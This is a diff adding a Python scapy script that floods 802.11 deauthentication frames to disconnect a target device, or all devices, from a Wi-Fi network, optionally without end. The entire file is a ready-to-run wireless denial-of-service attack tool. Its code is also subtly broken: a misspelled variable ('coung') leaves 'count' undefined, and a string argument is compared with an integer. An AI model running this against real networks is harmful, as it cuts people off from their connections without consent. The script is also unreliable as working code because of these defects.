@@ -1,0 +1,30 @@
+#!/usr/bin/env python
+
+from scapy.all import *
+import argparse
+
+def main():
+    parser = argparse.ArgumentParser(description='deauthenticate a device from a wifi')
+    parser.add_argument('target', type=str, help='target mac address (use ff:ff:ff:ff:ff:ff for all devices)')
+    parser.add_argument('gateway', type=str, help='gateway mac address')
+    parser.add_argument('interface', type=str, help='interface to use (must be in monitor mode)')
+    parser.add_argument("-c" , "--count", help="number of deauthentication frames to send, specify 0 to keep sending infinitely, default is 0", default=0)
+    args = parser.parse_args()
+
+    target_mac = args.target
+    gateway_mac = args.gateway
+    interface = args.interface
+    coung = args.count
+
+    if count == 0:
+        loop = 1
+        count = None
+    else:
+        loop = 0
+
+    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
+    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+    sendp(packet, inter=0.1, count=count, loop=loop, iface=interface, verbose=1)
+
+if __name__ == '__main__':
+    main()
